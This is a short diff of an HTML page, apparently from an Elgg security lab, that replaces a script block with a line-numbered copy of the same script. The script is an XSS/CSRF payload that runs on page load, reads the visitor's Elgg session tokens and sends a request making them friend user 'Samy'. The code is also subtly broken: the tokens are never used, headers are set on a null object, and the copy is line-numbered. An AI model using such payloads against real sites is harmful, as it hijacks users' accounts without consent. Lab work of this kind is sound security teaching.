@@ -39,22 +39,21 @@ test
     </script>
 </body>
 
-<script type="text/javascript">
-    window.onload = function () {
-        var Ajax = null;
-        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
-        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-        //Construct the HTTP request to add Samy as a friend.
-        var sendurl = 'http://www.csrflabelgg.com/action/friends/add?friend=45'; //FILL IN
-        //Create and send Ajax request to add friend
-        Ajax = new XMLHttpRequest();
-        Ajax.open("GET", sendurl, true);
-        Ajax.send();
-    }
-
-    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
-    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-</script>
+1  <script type="text/javascript">
+2      window.onload = function () {
+3          var Ajax = null;
+4          var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+5          var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+6          //Construct the HTTP request to add Samy as a friend.
+7          var sendurl = 'http://www.csrflabelgg.com/action/friends/add?friend=45'; //FILL IN
+8          //Create and send Ajax request to add friend
+9          Ajax = new XMLHttpRequest();
+10         Ajax.open("GET", sendurl, true);
+11         Ajax.send();
+12     }
+13     Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+14     Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+15 </script>
 
 
 </html>
